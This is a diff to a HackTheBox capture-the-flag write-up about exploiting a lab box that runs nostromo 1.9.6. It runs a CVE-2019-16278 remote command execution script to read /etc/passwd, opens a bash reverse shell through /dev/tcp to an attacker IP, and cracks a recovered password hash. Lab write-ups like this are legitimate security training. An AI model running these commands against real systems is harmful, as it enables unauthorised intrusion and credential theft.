@@ -31,4 +31,49 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-After the scan completed I found only 2 open ports 22 & 80.
+After the scan completed I found only 2 open ports 22 & 80. I also, noticed that the web server is running "nostrormo 1.9.6".
+
+I checked in searchsploit database if there is any exploit available for this version & I found 3:
+
+```bash
+searchsploit nostrormo
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5d6e281-0d88-4215-9b8d-82209ced2dc6)
+
+## Initial access:
+
+After checking the results of serachsploit I observed that only 2 are showing the relevant version & from these 2 only 1 is having python exploit as other one is showing the metasploit exploit.
+To not use the metasploit, I downloaded the python exploit & made some changes in the scirpt as it was showing error while running.
+
+After making the necessary changes, I executed the script & observed the results:
+
+```bash
+python cve-2019-16278.py 10.10.10.165 80 'cat /etc/passwd'
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a24e9815-044f-402b-b87b-7e3d7e90c107)
+
+In the /etc/passwd file I observed 1 user "david".
+
+Moving further to get a reverse shell, I used bash one-liner & executed it using the python script. After the execution I quickly received the reverse shell in my netcat listener. 🙂
+
+```bash
+python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.128/53 0>&1"'
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3b02ff8a-35ab-4d78-b109-108963928749)
+
+## User access:
+
+Now, I got the initial access as user "www-data" but I still don't have the user flag or sufficient access to read david's file.
+To gain access as david, I started looking for manually & in one of the directory "/var/nostromo/conf" I found hashed credential belongs to david.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e1ff9641-baee-4355-91e9-7b302ca5dfb2)
+
+I cracked this hash & gained the cleartext password from it:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9393b618-85b9-4d42-ab73-9fe7db127132)
+
+Using this password I tried to switch to David from www-data & also tried to login via SSH but none of them worked. 😕
+
+
+
+
